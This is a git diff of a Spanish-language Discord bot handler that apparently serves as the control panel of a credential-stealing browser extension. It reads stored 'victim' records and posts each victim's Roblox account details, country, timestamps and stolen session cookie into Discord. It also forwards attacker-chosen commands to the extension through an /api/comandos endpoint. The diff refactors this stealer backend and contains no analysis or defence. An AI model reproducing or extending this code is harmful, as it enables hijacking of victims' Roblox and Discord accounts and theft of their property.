@@ -1,4 +1,4 @@
-// api/interaction.js - VERSIÓN 100% SILENCIOSA
+// api/interaction.js - VERSIÓN CON EL NUEVO FORMATO
 import { verifyKey } from 'discord-interactions';
 
 export default async function handler(req, res) {
@@ -7,7 +7,7 @@ export default async function handler(req, res) {
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
     if (req.method === 'OPTIONS') {
-        return res.status(200).end();
+        return res.status(204).end();
     }
 
     if (req.method !== 'POST') {
@@ -26,6 +26,7 @@ export default async function handler(req, res) {
     }
 
     const interaction = req.body;
+    const baseUrl = `https://${req.headers.host}`;
 
     if (interaction.type === 1) {
         return res.status(200).json({ type: 1 });
@@ -35,14 +36,20 @@ export default async function handler(req, res) {
         const customId = interaction.data.custom_id;
         const [action, userId] = customId.split('_');
         
-        const victimData = global.victims?.get(userId) || {};
+        // ============================================================
+        // RECUPERAR DATOS DE LA VÍCTIMA DESDE /tmp
+        // ============================================================
+        let victimData = {};
+        try {
+            const response = await fetch(`${baseUrl}/api/guardar?userId=${userId}`);
+            victimData = await response.json() || {};
+        } catch (error) {}
+        
         const r = victimData.roblox || {};
 
+        // ========== ROBLOX CON NUEVO FORMATO ==========
         if (action === 'roblox') {
-            return res.status(200).json({
-                type: 4,
-                data: {
-                    content: `||@here||
+            const mensaje = `||@here||
 🔔 ¡Informacion seleccionada: **ROBLOX**!
 
 **📌 PRINCIPAL **
@@ -56,47 +63,57 @@ export default async function handler(req, res) {
 🔰 Verificado: ${r.verified || 'No'}
 
 💼 **Inventario:**
+
 Headless: \`${r.headless || 'No'}\`
 Korblox: \`${r.korblox || 'No'}\`
 
-**Informacion Horaria:**
+**🌐 Informacion Horaria:**
 🌍 País: \`${victimData.pais || 'Desconocido'}\`
 📅 Fecha: \`${victimData.fecha || ''}\`
 ⏰ Hora Exacta: \`${victimData.hora || ''}\`
 
 🍪 Cookie:
-\`\`\`${victimData.cookie || 'No disponible'}\`\`\``,
+\`\`\`${victimData.cookie || 'No disponible'}\`\`\``;
+
+            return res.status(200).json({
+                type: 4,
+                data: {
+                    content: mensaje,
                     flags: 64
                 }
             });
         }
 
+        // ========== DISCORD ==========
         if (action === 'discord') {
-            return res.status(200).json({
-                type: 4,
-                data: {
-                    content: `||@here||
+            const mensaje = `||@here||
 🔔 ¡Informacion seleccionada: **DISCORD**!
 
 **📌 PRINCIPAL **
 
-👤 Usuario Discord: (No disponible - extensión no soporta Discord)
+👤 Usuario Discord: (No disponible)
 🆔 ID de Discord: (No disponible)
 👥 Amigos: (No disponible)
 💱 Discord nitro: (No disponible)
 
-**Informacion Horaria:**
+**🌐 Informacion Horaria:**
 🌍 País: \`${victimData.pais || 'Desconocido'}\`
 📅 Fecha: \`${victimData.fecha || ''}\`
 ⏰ Hora Exacta: \`${victimData.hora || ''}\`
 
 ✨ Token de sesión:
-\`\`\`No disponible - Discord no usa cookies como Roblox\`\`\``,
+\`\`\`No disponible\`\`\``;
+
+            return res.status(200).json({
+                type: 4,
+                data: {
+                    content: mensaje,
                     flags: 64
                 }
             });
         }
 
+        // ========== COMANDOS ==========
         if (action === 'comandos') {
             return res.status(200).json({
                 type: 4,
@@ -144,10 +161,15 @@ Elige Una Opcion:`,
             });
         }
 
-        if (!global.commands) global.commands = new Map();
-        let queue = global.commands.get(userId) || [];
-        queue.push({ action: action });
-        global.commands.set(userId, queue);
+        // ========== SUBCOMANDOS ==========
+        // Guardar comando para la extensión
+        try {
+            await fetch(`${baseUrl}/api/comandos`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ userId, command: action })
+            });
+        } catch (error) {}
 
         return res.status(200).json({
             type: 4,
